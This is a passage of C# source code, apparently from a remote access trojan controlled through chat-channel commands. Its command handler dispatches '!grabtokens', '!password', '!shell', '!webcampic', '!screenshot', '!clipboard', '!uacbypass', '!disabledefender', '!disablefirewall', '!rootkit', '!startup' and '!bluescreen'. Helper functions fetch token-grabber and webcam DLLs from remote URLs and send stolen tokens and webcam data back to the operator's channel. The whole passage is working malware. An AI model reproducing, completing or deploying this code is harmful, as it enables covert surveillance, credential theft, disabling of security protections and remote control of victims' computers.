                await Send_message(channelid, "Error taking picture!");
                await Send_message(channelid, "Command executed!");
                return;
            }
        }
        public static async Task select_cam(string channelid, string number)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            int selection;
            try { selection = int.Parse(number); } catch { await Send_message(channelid, "Error that is not a number!"); return; }
            object active = activator_holder["webcam"];
            var runMethod = active.GetType().GetMethod("select");
            if (!(bool)runMethod.Invoke(active, new object[] { selection }))
            {
                await Send_message(channelid, "Error that is a invalid selection!");
            }
            else { await Send_message(channelid, "Selected onto camera " + selection); }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task get_cams(string channelid)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            object active = activator_holder["webcam"];
            var cameras = active.GetType().GetField("cameras").GetValue(active) as IDictionary<int, string>;
            if (cameras.Count < 1)
            {
                await Send_message(channelid, "No cameras found!");
                await Send_message(channelid, "Command executed!");
                return;
            }
            var runMethod = active.GetType().GetMethod("GetWebcams");
            string data = (string)runMethod.Invoke(active, new object[] { });
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "webcams.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task get_tokens(string channelid) 
        {
            if (!dll_holder.ContainsKey("token")) await LoadDll("token", await LinkToBytes(dll_url_holder["token"]));
            if (!activator_holder.ContainsKey("token"))
            {
                activator_holder["token"] = Activator.CreateInstance(dll_holder["token"].GetType("Token_grabber.grabber"));
            }
            var active = activator_holder["token"];
            List<string> data = (List<string>)active.GetType().GetMethod("grab").Invoke(active, new object[] { });
            string built = string.Join("\n\n", data);
            if (built.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(built) }, new string[] { "tokens.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + built + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task CommandHandler(string message_content, string[] attachment_urls) 
        {
            //await Send_attachment(ChannelId, "", new List<byte[]>() { Encoding.ASCII.GetBytes("test"), Encoding.ASCII.GetBytes("test2") },new string[] {"poggers.txt","pog.txt"});
            //await Send_message(ChannelId, message_data);
            if (!message_content.StartsWith("!")) return;
            string command = message_content.Split(" ".ToCharArray())[0];
            string message_data = string.Join(" ", message_content.Split(" ".ToCharArray()).Skip(1));
            switch (command)
            {
                case "!grabtokens":
                    await get_tokens(ChannelId);
                    break;
                case "!getcams":
                    await get_cams(ChannelId);
                    break;
                case "!selectcam":
                    await select_cam(ChannelId, message_data);
                    break;
                case "!webcampic":
                    await webcampic(ChannelId);
                    break;
                case "!message":
                    MessageBox.Show(message_data);
                    break;
                case "!shell":
                    await Task.Factory.StartNew(() => ShellCommand(message_data, ChannelId));
                    break;
                case "!voice":
                    await Speak(ChannelId, message_data);
                    break;
                case "!admincheck":
                    await Send_message(ChannelId, new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!cd":
                    Directory.SetCurrentDirectory(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!dir":
                    await dir(ChannelId);
                    break;
                case "!download":
                    await upload(ChannelId, message_data);
                    break;
                case "!upload":
                    if (attachment_urls.Length > 0)
                    {
                        try
                        {
                            File.WriteAllBytes(message_data, await LinkToBytes(attachment_urls[0]));
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch 
                        {
                            await Send_message(ChannelId, "Error writing file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!uploadlink":
                    if (message_data.Split(" ".ToCharArray()).Length > 1)
                    {
                        try
                        {
                            File.WriteAllBytes(message_data.Split(" ".ToCharArray())[0], await LinkToBytes(message_data.Split(" ".ToCharArray())[1]));
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch
                        {
                            await Send_message(ChannelId, "Error writing file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find filename or link!");
                    }
                    break;
                case "!delete":
                    if (message_data != null && message_data != "")
                    {
                        try
                        {
                            File.Delete(message_data);
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch
                        {
                            await Send_message(ChannelId, "Error deleting file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find filename!");
                    }
                    break;
                case "!write":
                    SendKeys.SendWait(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!wallpaper":
                    
                    if (attachment_urls.Length > 0)
                    {
                        await BytesToWallpaper(ChannelId, await LinkToBytes(attachment_urls[0]));
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!clipboard":
                    await GetClipboard(ChannelId);
                    break;
                case "!idletime":
                    await Send_message(ChannelId, (GetIdleTime()/1000).ToString());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!currentdir":
                    await Send_message(ChannelId, Directory.GetCurrentDirectory());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!block":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(true);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!unblock":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(false);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!screenshot":
                    await GetScreenshot(ChannelId);
                    break;
                case "!exit":
                    Application.Exit();
                    Environment.Exit(0);
                    break;
                case "!kill":
                    await Kill(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!uacbypass":
                    await uacbypass(Assembly.GetEntryAssembly().Location,ChannelId);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!shutdown":
                    Process.Start("shutdown", "/s /t 0");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!restart":
                    Process.Start("shutdown", "/r /t 0");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!logoff":
                    Process.Start("shutdown", "/L");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!bluescreen":
                    Bluescreen();
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!datetime":
                    await Send_message(ChannelId, DateTime.Now.ToString(@"MM\/dd\/yyyy h\:mm tt"));
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!prockill":
                    await ProcKill(ChannelId, message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!disabledefender":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableDefender(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!disablefirewall":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableFirewall(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!audio":
                    if (attachment_urls.Length > 0)
                    {
                        await PlayAudio(ChannelId, await LinkToBytes(attachment_urls[0]));
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!critproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        critproc();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!uncritproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        uncritproc();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!website":
                    Process.Start(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!disabletaskmgr":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        DisableTaskManager();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!enabletaskmgr":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        EnableTaskManager();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!startup":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        addstartupadmin();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        addstartupnonadmin();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    break;
                case "!geolocate":
                    await Send_message(ChannelId, await geolocate());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!listprocess":
                    await getprocs(ChannelId);
                    break;
                case "!password":
                    await sendpassword(ChannelId);
                    break;
                case "!rootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await Rootkit(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!unrootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await UnRootkit(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!help":
                    await helpmenu(ChannelId);
                    break;
            }
        }
   }
}
